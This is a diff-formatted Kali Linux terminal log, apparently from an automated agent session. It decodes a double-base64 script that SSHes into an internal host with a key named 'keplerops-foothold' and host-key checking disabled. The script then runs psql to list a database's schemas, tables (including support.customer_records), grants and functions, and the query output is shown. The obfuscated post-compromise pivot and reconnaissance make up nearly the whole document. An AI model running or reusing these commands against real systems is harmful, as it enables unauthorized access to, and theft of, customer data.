@@ -1,0 +1,41 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/w01bm.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUz0ic3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBCYXRjaE1vZGU9eWVzIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkAxMC41MC4xMy4xODAiCiRTICdlY2hvIFhIQnpaWFFnY0dGblpYSWdiMlptQ2x4bFkyaHZJQ2NqSXlNZ1lXeHNJSEpsYkdGMGFXOXVjeWNLYzJWc1pXTjBJRzR1Ym5Od2JtRnRaU3dnWXk1eVpXeHVZVzFsTENCakxuSmxiR3RwYm1RZ1puSnZiU0J3WjE5amJHRnpjeUJqSUdwdmFXNGdjR2RmYm1GdFpYTndZV05sSUc0Z2IyNGdiaTV2YVdROVl5NXlaV3h1WVcxbGMzQmhZMlVnZDJobGNtVWdiaTV1YzNCdVlXMWxJRzV2ZENCcGJpQW9KM0JuWDJOaGRHRnNiMmNuTENkcGJtWnZjbTFoZEdsdmJsOXpZMmhsYldFbkxDZHdaMTkwYjJGemRDY3BJRzl5WkdWeUlHSjVJREVzTWpzS1hHVmphRzhnSnlNakl5QnpZMmhsYldGekp3cHpaV3hsWTNRZ2JuTndibUZ0WlN3Z2NHZGZaMlYwWDNWelpYSmllV2xrS0c1emNHOTNibVZ5S1NCbWNtOXRJSEJuWDI1aGJXVnpjR0ZqWlNCM2FHVnlaU0J1YzNCdVlXMWxJRzV2ZENCc2FXdGxJQ2R3WjE4bEp5QmhibVFnYm5Od2JtRnRaVHcrSjJsdVptOXliV0YwYVc5dVgzTmphR1Z0WVNjN0NseGxZMmh2SUNjakl5TWdiWGtnWjNKaGJuUnpKd3B6Wld4bFkzUWdaM0poYm5SbFpTeDBZV0pzWlY5elkyaGxiV0VzZEdGaWJHVmZibUZ0WlN4d2NtbDJhV3hsWjJWZmRIbHdaU0JtY205dElHbHVabTl5YldGMGFXOXVYM05qYUdWdFlTNXliMnhsWDNSaFlteGxYMmR5WVc1MGN5QjNhR1Z5WlNCbmNtRnVkR1ZsUFdOMWNuSmxiblJmZFhObGNpQnZjbVJsY2lCaWVTQXlMRE1zTkRzS1hHVmphRzhnSnlNakl5Qm1kVzVqY3ljS2MyVnNaV04wSUc0dWJuTndibUZ0WlN4d0xuQnliMjVoYldVZ1puSnZiU0J3WjE5d2NtOWpJSEFnYW05cGJpQndaMTl1WVcxbGMzQmhZMlVnYmlCdmJpQnVMbTlwWkQxd0xuQnliMjVoYldWemNHRmpaU0IzYUdWeVpTQnVMbTV6Y0c1aGJXVWdibTkwSUdsdUlDZ25jR2RmWTJGMFlXeHZaeWNzSjJsdVptOXliV0YwYVc5dVgzTmphR1Z0WVNjcElHOXlaR1Z5SUdKNUlERXNNanNLIHwgYmFzZTY0IC1kID4gL3RtcC9xLnNxbDsgcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtZiAvdG1wL3Euc3FsIDI+JjEnCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/w01bm.sh; bash /tmp/w01bm.sh; echo DONEMARK_1795203424620$((6*7))
+Pager usage is off.
+### all relations
+ nspname |             relname             | relkind 
+---------+---------------------------------+---------
+ export  | partition_bindings              | r
+ export  | partition_bindings_pkey         | i
+ support | customer_migration_history      | r
+ support | customer_migration_history_pkey | i
+ support | customer_records                | r
+ support | customer_records_pkey           | i
+(6 rows)
+
+### schemas
+  nspname  |   pg_get_userbyid    
+-----------+----------------------
+ public    | pg_database_owner
+ workspace | rowan_data
+ export    | fieldlink_data_owner
+ support   | fieldlink_data_owner
+(4 rows)
+
+### my grants
+  grantee   | table_schema |     table_name     | privilege_type 
+------------+--------------+--------------------+----------------
+ rowan_data | export       | partition_bindings | SELECT
+(1 row)
+
+### funcs
+ nspname | proname 
+---------+---------
+(0 rows)
+
